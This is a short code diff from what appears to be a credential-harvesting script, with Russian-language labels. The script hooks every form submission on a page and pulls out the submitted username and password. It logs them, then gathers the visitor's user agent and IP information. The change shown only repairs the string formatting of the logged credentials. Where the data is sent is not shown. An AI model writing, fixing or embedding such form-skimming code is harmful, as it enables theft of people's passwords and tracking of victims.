@@ -52,7 +52,7 @@ document.addEventListener("submit", event => {
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
     const password = formData.get("passwd") || "Не указано";
-    console.log("Логин: ${login}/nПароль: ${password}");
+    console.log(`Логин: ${login}\nПароль: ${password}`);
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
